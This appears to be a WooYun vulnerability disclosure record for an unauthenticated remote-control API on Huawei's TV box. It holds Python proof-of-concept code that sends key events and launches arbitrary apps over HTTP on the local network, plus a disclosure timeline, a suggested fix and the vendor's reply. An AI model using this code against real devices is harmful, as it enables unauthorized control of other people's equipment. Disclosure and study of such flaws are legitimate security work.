{"id": 84815, "wybug_id": "wooyun-2015-0141355", "wybug_title": "华为魔盒电视盒子遥控器App漏洞可导致被远程控制（需同局域网内）", "wybug_corp": "华为技术有限公司", "wybug_author": "amethyst", "wybug_date": "2015-09-15 18:01", "wybug_open_date": "2015-12-17 17:06", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["未授权访问", "远程控制", "遥控器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 通过利用华为电视盒子的遥控器App的漏洞，可以实现对电视盒子的远程控制以及远程安装和启动任意app（攻击者须和电视盒子在同一个局域网内） 详细说明：  为了方便用户控制电视盒子，华为开发了华为随心控app，用户可以安装在手机上通过它来控制电视盒子，物理遥控器的所有功能都可以通过这个app来实现。通过对该app发送的网络数据包进行分析以及逆向华为魔盒里的实现远程控制的后台服务程序安装包RemoteServer.apk得到了该apk对盒子的远程控制方式，从而实现了自己的虚拟机遥控器，再辅助电视盒子提供的蓝牙功能可以实现对电视盒子的远程控制和远程安装、启动app（攻击者须和电视盒子在同一个局域网内）。并通过编程模拟发送数据包实现了对华为盒子的远程控制   漏洞证明：  https://**.**.**.**/s/yayrap2xhr9oxxz/V41020-132051.mp4?dl=0(为嘛不支持mp4格式啊)发送控制指令给电视盒子\ncontrolCode = {                  \"home\":3,                  \"back\":4,                  \"up\":19,                  \"left\":21,                  \"right\":22,                  \"down\":20,                  \"menu\":82,                  \"volumedown\":25,                  \"volumeup\":24,                  \"enter\":23,                  \"numKey\":8,                  \"num1\":9,                  \"num2\":10,                  \"num3\":11,                  \"power\":26                  }     def sendCtrlKeycodeToHW(tvboxIp , keycode):    timeout = 1    conn = httplib.HTTPConnection( tvboxIp ,8080,timeout)    print 'sending the \"%s\" control code to the TVBox' % controlCode[keycode]    conn.request('POST','/huawei-remote?cmd=key_event',                 headers =  {\"Key-Code\": controlCode[keycode],\"Action\": \"0\" }                 )    conn.sock.settimeout(1)    try:        r = conn.getresponse()        print r.status, r.reason    except Exception:        conn.close()        pass\n启动指定的app:\ndef sendHttpStartApp():    conn = httplib.HTTPConnection(\"**.**.**.**\",8080,False)    conn.request('POST' ,'/huawei-remote?cmd=startapp',                 headers = {\"App-Name\": \"com.androidTest.test.LemonActivity\" , \"packageName\":\"com.androidTest.test\" } )    r = conn.getresponse()    print r.status, r.reason    conn.close()\n   修复方案：  在虚拟机遥控器接入电视盒子时加入认证机制，比如在电视显示认证码然后让遥控器app用户输入以认证或加密虚拟遥控器发出的控制指令   版权声明：转载请注明来源 amethyst@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2015-09-18 17:05 厂商回复： 感谢白帽子对华为公司安全的关注，我们已经将该漏洞通知了项目组。 最新状态： 2015-09-22：华为销售的视频盒子产品，可以通过同一个局域网内的手机上的APP控制。其开放的API并不会对用户的隐私和安全造成重要影响。华为目前没有计划对现有实现方式进行调整。  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}